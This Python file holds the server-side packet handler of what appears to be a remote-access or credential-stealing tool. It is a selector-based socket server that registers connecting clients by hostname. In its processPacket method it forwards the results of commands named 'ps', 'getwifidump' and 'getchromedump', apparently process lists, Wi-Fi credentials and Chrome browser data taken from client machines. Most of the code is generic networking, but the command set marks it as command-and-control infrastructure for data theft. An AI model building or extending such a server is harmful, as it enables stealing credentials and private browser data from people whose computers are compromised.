import selectors
import socket
import struct
import json

class ServerPacket:
    def __init__(self, clientSocket: socket.socket, clientAddress: tuple, sel: selectors.DefaultSelector, signals) -> None:
        self.clientSocket = clientSocket
        self.address = clientAddress
        self.sel = sel
        self.clientInfo = {"ID": None}

        self.signals = signals

        self.BUFFER_SIZE = 4096
        self.recvBuffer = bytearray()
        self.sendBuffer = bytearray()

        self.packetHeaderSize = None
        self.packetHeader = None
        self.dataSize = None


    def handleClient(self, mask: int):
        if mask & selectors.EVENT_READ:
            self.readPacket()
        if mask & selectors.EVENT_WRITE:
            self.writePacket()

    def closeConn(self):
        try:
            self.sel.unregister(self.clientSocket)
        except Exception as err:
            print("[ClientPacket](closeConn)> Error:", err)
        try:
            self.clientSocket.close()
        except OSError as err:
            print("[ClientPacket](closeConn)> Error:", err)
        finally:
            self.clientSocket = None
            self.signals.clientEscaped.emit(self.clientInfo)

    def readPacket(self):
        self.recvIt()
        if self.recvBuffer:
            if self.packetHeaderSize is None:
                self.getPacketHeaderSize()
            if self.packetHeaderSize is not None:
                if len(self.recvBuffer) >= self.packetHeaderSize:
                    if self.packetHeader is None:
                        self.getPacketHeader()
            if self.dataSize is not None:
                if len(self.recvBuffer) >= self.dataSize:
                    self.getPacket()
                    # Set selector to listen for write events, we're done reading.
                    self.sel.modify(self.clientSocket, events=selectors.EVENT_WRITE, data=self)

    def recvIt(self):
        try:
            chunk = self.clientSocket.recv(self.BUFFER_SIZE)
            if chunk:
                self.recvBuffer.extend(chunk)
            else:
                self.closeConn()
        except BlockingIOError:
            pass  # Resource temporarily unavailable (errno EWOULDBLOCK)
        except OSError as err:  # expecting [WinError 10054] (client forcibly closed connection)
            raise OSError(f"[Packet](recvIt):", err)

    def getPacketHeaderSize(self):
        self.packetHeaderSize = struct.unpack('>H', self.recvBuffer[:2])[0]
        self.recvBuffer = self.recvBuffer[2:]

    def getPacketHeader(self):
        self.packetHeader = json.loads(self.recvBuffer[:self.packetHeaderSize])
        self.recvBuffer = self.recvBuffer[self.packetHeaderSize:]
        self.dataSize = self.packetHeader["size"]

    def getPacket(self):
        data = self.recvBuffer[:self.dataSize]
        self.recvBuffer = self.recvBuffer[self.dataSize:]
        packetBody = data.decode(self.packetHeader["encoding"])
        self.processPacket(packetBody)
        self.packetHeaderSize = None
        self.packetHeader = None
        self.dataSize = None

    def processPacket(self, data: any):
        if self.packetHeader["type"] == 'str':
            if self.packetHeader["cmdInfo"] == "hostname":
                self.clientInfo['hostName'] = data
                self.signals.clientJoined.emit(self.clientInfo)
            if self.packetHeader["cmdInfo"] in ["ps", "getwifidump", "getchromedump"]:
                self.signals.cmdResult.emit((self.clientInfo['ID'], data))

    def writePacket(self):
        if self.sendBuffer:
            self.sendIt()
        if not self.sendBuffer:
            # Set selector to listen for read events, we're done writing.
            self.sel.modify(self.clientSocket, events=selectors.EVENT_READ, data=self)

    def sendIt(self):
        try:
            bytesSent = self.clientSocket.send(self.sendBuffer)
            self.sendBuffer = self.sendBuffer[bytesSent:]
        except BlockingIOError:
            pass  # Resource temporarily unavailable (errno EWOULDBLOCK)
        except OSError as err:  # expecting [WinError 10054] (client forcibly closed connection)
            raise OSError(f"[Packet](sendIt):", err)

    def createPacket(self, dataType: str, data: bytes, encoding: str='utf-8'):
        # create jsonHeader
        header = json.dumps({"size": len(data), "type": dataType, "encoding": encoding}).encode()
        headerSize = struct.pack('>H', len(header))
        self.sendBuffer = headerSize + header + data
        self.sel.modify(self.clientSocket, events=selectors.EVENT_WRITE, data=self)

